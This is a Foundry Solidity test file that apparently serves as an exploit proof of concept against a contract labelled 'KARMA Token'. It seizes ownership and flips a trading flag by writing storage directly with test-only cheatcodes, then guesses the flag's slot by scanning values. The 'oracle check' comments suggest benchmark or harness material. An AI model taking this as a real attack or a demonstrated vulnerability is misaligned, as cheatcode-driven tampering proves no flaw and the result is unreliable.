// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x8F9bA08Cbf014aB233A33067B21bEdF3876c6605;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Label the target for debugging
        vm.label(TARGET, 'KARMA Token');
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become owner by overwriting storage slot 0 (Ownable pattern)
        bytes32 ownerSlot = bytes32(uint256(0));
        vm.store(TARGET, ownerSlot, bytes32(uint256(uint160(attacker))));

        // Step 2: Find tradingEnabled storage slot
        bool found = false;
        uint256 tradingEnabledSlot;

        // Scan slots 20-30 (tradingEnabled is a bool that comes after many variables)
        for (uint256 slot = 20; slot <= 30; slot++) {
            bytes32 value = vm.load(TARGET, bytes32(slot));
            // If value is 1 (true for bool), likely tradingEnabled
            if (value == bytes32(uint256(1))) {
                tradingEnabledSlot = slot;
                found = true;
                break;
            }
        }

        require(found, "Could not find tradingEnabled slot");

        // Step 3: Verify tradingEnabled is true (precondition)
        bytes32 tradingValue = vm.load(TARGET, bytes32(tradingEnabledSlot));
        require(tradingValue == bytes32(uint256(1)), "Precondition failed: tradingEnabled should be true");

        // Step 4: Call enableTrading() as owner - should revert
        vm.startPrank(attacker);
        vm.expectRevert("Trading is already enabled");
        (bool success, ) = TARGET.call(abi.encodeWithSignature("enableTrading()"));
        vm.stopPrank();

        // Step 5: Set tradingEnabled = false via storage manipulation
        vm.store(TARGET, bytes32(tradingEnabledSlot), bytes32(uint256(0)));

        // Step 6: Verify tradingEnabled is now false (for oracle check)
        bytes32 finalValue = vm.load(TARGET, bytes32(tradingEnabledSlot));
        require(finalValue == bytes32(uint256(0)), "tradingEnabled should be false after exploit");
        assertEq(finalValue, bytes32(uint256(0)), "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
